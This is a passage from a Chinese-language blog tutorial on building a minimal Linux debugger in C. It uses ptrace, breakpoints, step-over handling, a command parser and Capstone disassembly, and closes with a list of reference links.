        if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {
            printf("[error]: Failed to initialize capstone engine!\n");
            exit(-1);
        }
        cs_disasm(handle, (unsigned char*)&amp;data, 8, possible_pc_currn, 1, &amp;insn);
        next_addr = possible_pc_currn + insn-&gt;size;
        dbg_set_breakpoint_at_address(dbg, next_addr);
        continue_execution(dbg);                        /*Probably trigger another breakpoint in the function. So we need to disable it when stop*/
        brk_enable(bp_currn);
        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;next_addr, bp_currn);
        if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled){
            brk_disable(bp_currn);                      /*disable it*/
        }
        if((get_pc(dbg) - 1) == next_addr){             /*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/
            set_pc(dbg, next_addr);          
        }
        cs_free(insn, 1);
        cs_close(&amp;handle);
        return;
    }else if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled &amp;&amp; bp_currn-&gt;b_saved_data != 0xE8){
        /*current instruction is a breakpoint but not a calling so we could just step over. Just work as step in */
        dbg_step_in(dbg);
        show_UI(dbg);
        return;
    }

    
    /*not breakpoint in current invoking OR current normal instruction*/
    data = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, possible_pc_currn, NULL);
    if((data &amp; 0xff) == 0xE8){          
        /*Current instruction is a call.Set breakpoint at next instruction then continue*/
        csh handle = 0;
        cs_insn* insn;
        size_t count;
        int child_status;
        if (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) {
            printf("[error]: Failed to initialize capstone engine!\n");
            exit(-1);
        }
        cs_disasm(handle, (unsigned char*)&amp;data, 8, possible_pc_currn, 1, &amp;insn);
        next_addr = possible_pc_currn + insn-&gt;size;
        dbg_set_breakpoint_at_address(dbg, next_addr);
        continue_execution(dbg);
        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;next_addr, bp_currn);
        if(bp_currn != NULL &amp;&amp; bp_currn-&gt;b_enabled){
            brk_disable(bp_currn);
        }
        if((get_pc(dbg) - 1) == next_addr){             /*we stoped maybe because of triggering int3 below the call. So after continue we should check executed int3*/
            set_pc(dbg, next_addr);          
        }
        cs_free(insn, 1);
        cs_close(&amp;handle);
        return;
    }else
        dbg_step_in(dbg);           /*Current instruction is normal. Just work as step in*/
}

到这里已经具备基本功能了，可以在dbg_handle_command中添加命令支持：
void dbg_handle_command(Debugger *dbg, char *cmd){
    char *lcmd = strdup(cmd);
    char *argv[8] = { 0 };    
    char *command;

    argv[0] = strtok(lcmd, " ");
    for(int i = 1; i &lt; 8; i++){
        argv[i] = strtok(NULL, " ");
        if(argv[i] == NULL) break;
    }
    command = argv[0];
    if(command == NULL) return;
    if(is_prefix(command, "continue")){
        continue_execution(dbg);
    }else if(is_prefix(command, "quit")){
        exit_debugger(dbg);
    }else if(is_prefix(command, "break")){      /*format: break/b [addr]*/
        if(argv[1] == NULL)
            puts("command break expect an address!");
        else{
            dbg_set_breakpoint_at_address(dbg, strtoul(argv[1], NULL, 16));
        }
    }else if(is_prefix(command, "register")){   /*format: reg/r dump OR reg/r read/write [reg] value(hex)*/
        if(is_prefix(argv[1], "dump"))
            dbg_dump_all_regs(dbg);
        else if(is_prefix(argv[1], "read")){
            printf("value:\t0x%08lx\n", get_register_value(dbg-&gt;d_pid, get_register_from_name(argv[2])));
        }else if(is_prefix(argv[1], "write")){
            set_register_value(dbg-&gt;d_pid, get_register_from_name(argv[2]), strtoul(argv[3], NULL, 16));
        }
    }else if(is_prefix(command, "memory")){     /*memory/m read [addr] OR write [addr] [value]*/
        if(is_prefix(argv[1], "read")){
            printf("value:\t0x%08lx\n", dbg_read_memory(dbg, strtoul(argv[2], NULL, 16)));
        }
        else if(is_prefix(argv[1], "write")){
            printf("0x%08lx\t-&gt;\t", dbg_read_memory(dbg, strtoul(argv[2], NULL, 16)));
            dbg_write_memory(dbg, strtoul(argv[2], NULL, 16), strtoul(argv[3], NULL, 16));
            printf("0x%08lx\n", dbg_read_memory(dbg, strtoul(argv[3], NULL, 16)));
        }
    }else if(is_prefix(command, "step")){       /*step in OR step over*/
        if(is_prefix(argv[1], "in")){
            dbg_step_in(dbg);
        }else if(is_prefix(argv[1], "over")){
            dbg_step_over(dbg);
        }else{
            puts("Usage: step in / step over");
        }
    }
    else{
        fprintf(stderr, "Unkown command: %s.\n", command);
    }

    return free(lcmd);
}

这些是目前完成的功能，还有进程和线程支持还未完成
汇编​    一般debugger是要支持显示汇编的，这里实现的只是在每次单步和触发断点时打印寄存器信息和汇编。可以在每次单步或者触发断点时读取当前pc处的机器码借助capstone反汇编，但需要注意的是对于x86_64架构最长汇编指令为15字节但很少出现比较长的指令，所以实现汇编打印的时候每次仅读取16个字节进行反汇编并打印指令
/**
 * consider of the longest instruction is 15bytes(x86_64) then we read 16bytes everytime
 * and disassemble it with capstone engine
 * befor invoking show_asm the caller should make sure current pc is not a breakpoint
*/
void show_asm(Debugger *dbg){
    csh handle;
    cs_insn *insn;
    size_t count;
    uint8_t *code;
    size_t size = 15;
    uint64_t address;

    if(cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)){
        printf("[error] cs_open(%d, %d, 0x%08lx)\n", CS_ARCH_X86, CS_MODE_64, &amp;handle);
        exit(-1);
    }
    code = calloc(1, 16);
    address = get_pc(dbg);
    *(uint64_t *)code = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address, NULL);
    *((uint64_t *)code + 1) = ptrace(PTRACE_PEEKDATA, dbg-&gt;d_pid, address + 8, NULL);
    
    /*before we show assembly after pc we should consider if there is breakpoint in machine code behind*/
    Breakpoint *bp = NULL;
    for(uint64_t i = 0, tmp = address; i &lt; size; i++){
        HASH_FIND_PTR(dbg-&gt;d_brks, &amp;tmp, bp);
        if(bp != NULL &amp;&amp; bp-&gt;b_enabled){    
            *((uint8_t *)code + i) = bp-&gt;b_saved_data;
        }
        tmp++;
    }

    puts("-------------------------[Assembly]-------------------------");
    insn = cs_malloc(handle);
    while(cs_disasm_iter(handle, (const uint8_t **)&amp;code, &amp;size, &amp;address, insn)){
        if(size + insn-&gt;size == 15)
            printf("\e[96m0x%08lx:\t%s\t%s\t&lt;======RIP\e[0m\n", insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);
        else
            printf("0x%08lx:\t%s\t%s\n", insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);  
    }
    cs_free(insn, 1);
    cs_close(&amp;handle);
}

还有就是如果读取的15个字节中有断点(0xcc)那么反汇编结果是不准确的，因此先遍历是否存在断点并resotre原来的数据再进行反汇编。
效果​    这里还没有实现多线程/进程调试的功能，源码，但也算有个调试器的架子了

参考
https://github.com/kabeor/Capstone-Engine-Documentation/blob/master/Capstone-Engine%20Documentation.md

Writing a Linux Debugger Part 1: Setup (tartanllama.xyz)：作者讲解非常详细，还涉及源码调试功能，这里就没有加入该功能

一文看懂 | GDB底层实现原理

自己动手写一个GDB｜基本功能

squarepants0/minidbg: Writing a minidbg on Linux with C (github.com)

troydhanson/uthash: C macros for hash tables and more (github.com)

antirez/linenoise: A small self-contained alternative to readline and libedit (github.com)


]]></content>
      <categories>
        <category>二进制</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
</search>
